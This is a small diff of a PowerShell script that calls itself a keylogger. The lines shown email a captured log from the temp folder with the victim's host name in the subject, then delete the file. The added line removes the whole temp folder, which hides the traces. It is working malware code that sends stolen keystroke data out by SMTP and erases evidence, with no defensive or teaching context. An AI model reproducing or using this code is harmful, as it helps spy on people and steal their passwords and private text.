@@ -12,3 +12,4 @@ $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:co
 $ReportEmail.Attachments.Add("$ENV:temp\test\testing123.txt");$SMTPInfo.Send($ReportEmail);
 timeout 10
 Remove-Item "$env:temp\test\testing123.txt"
+Remove-Item "$env:temp\test" -Recurse
